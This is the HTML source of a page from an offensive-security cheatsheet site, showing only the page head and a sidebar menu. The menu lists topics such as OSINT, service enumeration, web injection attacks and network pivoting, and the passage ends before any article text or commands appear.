<!DOCTYPE html>
<html>
  <head>
    <title>Offensive Security Cheatsheet</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2020-04-23T18:56:15 CEST">
<title>Tricks :: Offensive Security Cheatsheet</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/windows-systems/privilege-escalation/tricks/">
    
      <header>
  <div class="logo">
    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock/archive/master.zip"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://gohugo.io/"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Hugo Documentation</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
          <li data-nav-id="/" class="dd-item">
          <a href="/">
            <i class="fa fa-fw fa-home"></i>
          </a>
          </li>
    <li data-nav-id="/open-source-intelligence-osint/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/open-source-intelligence-osint/general/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/general/">General</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/open-source-intelligence-osint/general/firefox_addons/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/general/firefox_addons/">
            Firefox addons
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/general/methodology/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/general/methodology/">
            Methodology
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/open-source-intelligence-osint/technical-recon/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/technical-recon/">Technical Recon</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/domain_ip/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/domain_ip/">
            Domain &amp; IP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/subdomain_enumeration/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/subdomain_enumeration/">
            Subdomain Enumeration
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/dorks/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/dorks/">
            Dorks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/company_meta/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/company_meta/">
            Company General Informations
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/photon/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/photon/">
            Photon
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/misc/">
            MISC
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
    <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/">Frameworks &amp; Correlation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/">
            Recon-ng
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/">
            Gasmak
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/">
            Omnibus
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/">
            Spiderfoot
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/">
            Datasploit
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/">
            Danger Zone
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/">
            ReconDog
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/">
            OSINT-SPY
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/">
            Belati
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/">
            sn0int
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/technical-recon/documents_metadata/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/technical-recon/documents_metadata/">
            
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/open-source-intelligence-osint/hosting-and-repositories/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/hosting-and-repositories/">Hosting &amp; Repositories</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/open-source-intelligence-osint/hosting-and-repositories/github/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/hosting-and-repositories/github/">
            Github
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/">
            Amazon &amp; Digital Ocean Buckets
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/open-source-intelligence-osint/human-recon/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/human-recon/">Human Recon</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/" class="dd-item haschildren
        ">
      <div>
      <a href="/open-source-intelligence-osint/human-recon/social-networks/">Social Networks</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/linkedin/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/linkedin/">
            LinkedIn
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/twitter/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/twitter/">
            Twitter
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/facebook/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/facebook/">
            Facebook
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/instagram/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/instagram/">
            Instagram
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/tinder/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/tinder/">
            Tinder
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/snapchat/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/snapchat/">
            Snapchat
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/">
            Usernames and Emails
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/general_misc/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/social-networks/general_misc/">
            General - MISC - Multi
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/email/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/email/">
            E-mails
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/leaks/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/leaks/">
            Password leaks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/searchingsomeone/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/searchingsomeone/">
            Searching Someone
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/skiptracer/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/skiptracer/">
            Skiptracer
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/geolocation/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/geolocation/">
            Geolocation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/phone_number/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/phone_number/">
            Geolocation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/human-recon/images/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/human-recon/images/">
            Images
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
      <li data-nav-id="/open-source-intelligence-osint/buscador/" class="dd-item">
        <div>
          <a href="/open-source-intelligence-osint/buscador/">
            Buscador
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/recon-enumeration/" class="dd-item haschildren
        ">
      <div>
      <a href="/recon-enumeration/">Recon - Enumeration</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/recon-enumeration/application-scans/" class="dd-item haschildren
        ">
      <div>
      <a href="/recon-enumeration/application-scans/">Applications Scans</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/recon-enumeration/application-scans/web_application_scan/" class="dd-item">
        <div>
          <a href="/recon-enumeration/application-scans/web_application_scan/">
            Web Application Scans
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/application-scans/aquatone/" class="dd-item">
        <div>
          <a href="/recon-enumeration/application-scans/aquatone/">
            Aquatone
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/application-scans/vhost/" class="dd-item">
        <div>
          <a href="/recon-enumeration/application-scans/vhost/">
            VHOST Scanning
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/application-scans/web_application_firewall/" class="dd-item">
        <div>
          <a href="/recon-enumeration/application-scans/web_application_firewall/">
            Web Application Firewall (WAF)
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/recon-enumeration/port-scanning/" class="dd-item haschildren
        ">
      <div>
      <a href="/recon-enumeration/port-scanning/">Ports Scanning</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/recon-enumeration/port-scanning/masscan_cheatsheet/" class="dd-item">
        <div>
          <a href="/recon-enumeration/port-scanning/masscan_cheatsheet/">
            Masscan Cheatsheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/port-scanning/nmap_cheatsheet/" class="dd-item">
        <div>
          <a href="/recon-enumeration/port-scanning/nmap_cheatsheet/">
            Nmap Cheatsheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/recon-enumeration/services-enumeration/" class="dd-item haschildren
        ">
      <div>
      <a href="/recon-enumeration/services-enumeration/">Services Enumeration</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/recon-enumeration/services-enumeration/21_ftp/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/21_ftp/">
            21 - FTP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/22_ssh/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/22_ssh/">
            22 - SSH
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/25_smtp/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/25_smtp/">
            25 - SMTP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/53_dns/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/53_dns/">
            53 - DNS
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/80_443_https/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/80_443_https/">
            80/443 - HTTP/HTTPS
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/110_pop3/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/110_pop3/">
            110 - POP3
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/119_nntp/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/119_nntp/">
            119 - NTP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/135_rpc/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/135_rpc/">
            135 - RPC
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/139_445_smb/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/139_445_smb/">
            139/445 - SMB
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/143_imap/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/143_imap/">
            143 - IMAP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/161_162_snmp/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/161_162_snmp/">
            161/162 - SNMP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/389_636_3269_ldap/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/389_636_3269_ldap/">
            389/636/3269 - LDAP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/995_pop3s/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/995_pop3s/">
            995 - POP3S
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/1025_nfs_iis/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/1025_nfs_iis/">
            1025 - NFS/IIS
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/1433_mssql/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/1433_mssql/">
            1433 - MSSQL
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/1721_500_vpn/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/1721_500_vpn/">
            1721/500 - VPN
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/3306_mysql/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/3306_mysql/">
            3306 - MySQL
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/3389_rdp/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/3389_rdp/">
            3389 - RDP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/recon-enumeration/services-enumeration/4555_rsip/" class="dd-item">
        <div>
          <a href="/recon-enumeration/services-enumeration/4555_rsip/">
            4555 - RSIP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>
    <li data-nav-id="/web-attacks/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/">Web vulnerabilities &amp; attacks</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/web-attacks/server-side-injections/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/server-side-injections/">Server Side Injections</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/web-attacks/server-side-injections/sql/" class="dd-item">
        <div>
          <a href="/web-attacks/server-side-injections/sql/">
            SQL Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/server-side-injections/nosql/" class="dd-item">
        <div>
          <a href="/web-attacks/server-side-injections/nosql/">
            NoSQL Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/server-side-injections/ldap/" class="dd-item">
        <div>
          <a href="/web-attacks/server-side-injections/ldap/">
            LDAP Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/server-side-injections/xpath/" class="dd-item">
        <div>
          <a href="/web-attacks/server-side-injections/xpath/">
            XPath Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/server-side-injections/ssrf/" class="dd-item">
        <div>
          <a href="/web-attacks/server-side-injections/ssrf/">
            Server Side Request Forgery (SSRF)
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/web-attacks/client-side-injections/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/client-side-injections/">Client Side Injections</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/web-attacks/client-side-injections/xss/" class="dd-item">
        <div>
          <a href="/web-attacks/client-side-injections/xss/">
            XSS Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/client-side-injections/csrf/" class="dd-item">
        <div>
          <a href="/web-attacks/client-side-injections/csrf/">
            CSRF Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/client-side-injections/misc_others/" class="dd-item">
        <div>
          <a href="/web-attacks/client-side-injections/misc_others/">
            MISC &amp; Others
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/web-attacks/files-inclusions-and-injections/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/files-inclusions-and-injections/">File Inclusion and Injections</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/web-attacks/files-inclusions-and-injections/file_upload/" class="dd-item">
        <div>
          <a href="/web-attacks/files-inclusions-and-injections/file_upload/">
            File Upload
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/files-inclusions-and-injections/directory_file_discovery/" class="dd-item">
        <div>
          <a href="/web-attacks/files-inclusions-and-injections/directory_file_discovery/">
            Directory &amp; File Discovery
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/files-inclusions-and-injections/xxe/" class="dd-item">
        <div>
          <a href="/web-attacks/files-inclusions-and-injections/xxe/">
            XML External Entity (XXE) and XSLT
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/web-attacks/php-vulnerabilities/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/php-vulnerabilities/">PHP Vulnerabilities</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/web-attacks/php-vulnerabilities/php_filters/" class="dd-item">
        <div>
          <a href="/web-attacks/php-vulnerabilities/php_filters/">
            PHP Filters
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/php-vulnerabilities/functions/" class="dd-item">
        <div>
          <a href="/web-attacks/php-vulnerabilities/functions/">
            PHP Functions
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/php-vulnerabilities/serialization/" class="dd-item">
        <div>
          <a href="/web-attacks/php-vulnerabilities/serialization/">
            PHP Serialization
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/php-vulnerabilities/type_juggling/" class="dd-item">
        <div>
          <a href="/web-attacks/php-vulnerabilities/type_juggling/">
            PHP Type Juggling
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/php-vulnerabilities/tricks_others/" class="dd-item">
        <div>
          <a href="/web-attacks/php-vulnerabilities/tricks_others/">
            Tricks &amp; Others
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/web-attacks/content-management-system-cms/" class="dd-item haschildren
        ">
      <div>
      <a href="/web-attacks/content-management-system-cms/">Content Management Systems (CMS)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/web-attacks/content-management-system-cms/wordpress/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/wordpress/">
            Wordpress
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/content-management-system-cms/drupal/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/drupal/">
            Drupal
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/content-management-system-cms/joomla/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/joomla/">
            Joomla!
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/content-management-system-cms/magento/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/magento/">
            Magento
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/content-management-system-cms/cmsmap/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/cmsmap/">
            CMSMap
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/content-management-system-cms/others/" class="dd-item">
        <div>
          <a href="/web-attacks/content-management-system-cms/others/">
            MISC &amp; Others
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
      <li data-nav-id="/web-attacks/headers_injections/" class="dd-item">
        <div>
          <a href="/web-attacks/headers_injections/">
            Headers Injections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/misc_others/" class="dd-item">
        <div>
          <a href="/web-attacks/misc_others/">
            MISC &amp; Others
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/burpsuite/" class="dd-item">
        <div>
          <a href="/web-attacks/burpsuite/">
            BurpSuite
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/postman/" class="dd-item">
        <div>
          <a href="/web-attacks/postman/">
            Postman
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/amazon_web_services/" class="dd-item">
        <div>
          <a href="/web-attacks/amazon_web_services/">
            Amazon Web Services (AWS)
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/web-attacks/attacking_apis/" class="dd-item">
        <div>
          <a href="/web-attacks/attacking_apis/">
            Attacking APIs
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/network/" class="dd-item haschildren
        ">
      <div>
      <a href="/network/">Network</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/network/pivot_techniques/" class="dd-item">
        <div>
          <a href="/network/pivot_techniques/">
            Pivot Techniques
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/network/ldap_dns/" class="dd-item">
        <div>
          <a href="/network/ldap_dns/">
            LDAP &amp; DNS
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/network/mac_arp/" class="dd-item">
        <div>
          <a href="/network/mac_arp/">
            MAC &amp; ARP
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/network/icmp/" class="dd-item">
        <div>
          <a href="/network/icmp/">
            ICMP Tricks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
